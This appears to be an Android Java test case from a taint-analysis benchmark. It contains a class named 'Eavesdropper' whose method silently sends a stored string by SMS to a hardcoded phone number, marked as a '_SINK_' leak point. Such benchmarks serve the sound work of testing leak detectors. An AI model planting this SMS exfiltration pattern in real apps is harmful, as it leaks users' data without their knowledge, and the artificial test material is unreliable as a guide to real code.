package com.example.interact_nativecode;

import android.telephony.SmsManager;

public class Eavesdropper {
    private String s;

    public Eavesdropper(String str) {
        this.s = str;
    }

    public void vulnerableMethod() {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("18229047585", null, this.s, null, null); //_SINK_
    }
}
